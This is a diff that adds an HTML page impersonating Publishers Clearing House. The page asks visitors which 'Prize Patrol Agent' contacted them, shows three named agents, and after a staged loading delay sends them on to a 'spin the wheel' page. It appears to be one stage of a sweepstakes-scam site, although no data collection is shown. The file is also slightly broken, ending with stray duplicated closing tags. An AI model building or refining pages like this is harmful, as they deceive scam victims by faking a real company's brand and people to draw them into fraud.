@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PCH Giveaway - Select Agent</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }
+
+body {
+    background: #ffffff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+/* Top banner */
+.banner {
+    width: 100%;
+    background: #fbc02d;
+    color: #ffffff;
+    font-weight: bold;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 10px 0;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+.banner-content {
+    display: flex;
+    align-items: center;
+}
+
+.banner-logo {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    background-image: url('pch_logo.jpg');
+    background-size: cover;
+    background-position: center;
+    margin-right: 10px;
+}
+
+.banner-text {
+    font-size: 1.2em;
+}
+
+/* Container */
+.container {
+    background: #fff9c4;
+    padding: 30px 20px;
+    border-radius: 20px;
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    margin-top: 30px;
+}
+
+h1 {
+    color: #fbc02d;
+    margin-bottom: 20px;
+}
+
+p {
+    margin-bottom: 25px;
+    font-size: 1.1em;
+}
+
+/* Agent selection */
+.agent-option {
+    display: flex;
+    align-items: center;
+    background: #fffbe6;
+    border: 2px solid #fdd835;
+    border-radius: 15px;
+    padding: 15px;
+    margin-bottom: 15px;
+    cursor: pointer;
+    transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.agent-option:hover {
+    transform: scale(1.03);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+
+.agent-option img {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    margin-right: 15px;
+}
+
+.agent-option span {
+    flex: 1;
+    color: #fbc02d;
+    font-weight: bold;
+    font-size: 1em;
+}
+
+.agent-option input[type="radio"] {
+    width: 20px;
+    height: 20px;
+    accent-color: #fbc02d;
+}
+ 
+button {
+    margin-top: 20px;
+    padding: 12px 25px;
+    border: none;
+    border-radius: 10px;
+    background: #fbc02d;
+    color: #fff;
+    font-size: 1em;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: scale(1.05);
+}
+</style>
+</head>
+<body>
+
+<div class="banner">
+    <div class="banner-content">
+        <div class="banner-logo"></div>
+        <span class="banner-text">PUBLISHERS CLEARING HOUSE</span>
+    </div>
+</div>
+
+<div class="container">
+    <h1>Which Prize Patrol Agent Contacted You?</h1>
+    <p>Select your agent from the options below:</p>
+
+    <label class="agent-option">
+        <img src="daniella.jpg" alt="Daniella Lam">
+        <span>Daniella Lam</span>
+        <input type="radio" name="agent" value="Daniella Lam">
+    </label>
+
+    <label class="agent-option">
+        <img src="dave.jpg" alt="Dave Sawyer">
+        <span>Dave Sawyer</span>
+        <input type="radio" name="agent" value="Dave Sawyer">
+    </label>
+
+    <label class="agent-option">
+        <img src="andrew.jpg" alt="Andrew Golberg">
+        <span>Andrew Golberg</span>
+        <input type="radio" name="agent" value="Andrew Golberg">
+    </label>
+
+    <button id="proceedBtn">Proceed</button>
+</div>
+
+<script>
+document.getElementById('proceedBtn').addEventListener('click', function(){
+    const selected = document.querySelector('input[name="agent"]:checked');
+    if(selected){
+        (`You selected: ${selected.value}`);
+        this.disabled = true;
+        this.innerText = "Loading...";
+        setTimeout(()=>{ window.location.href = "5wheel.spin.html"; }, 5000);
+    } else {
+        alert("Please select an agent before proceeding.");
+    }
+});
+</script>
+
+</body>
+</html>ript>
+
+</body>
+</html>
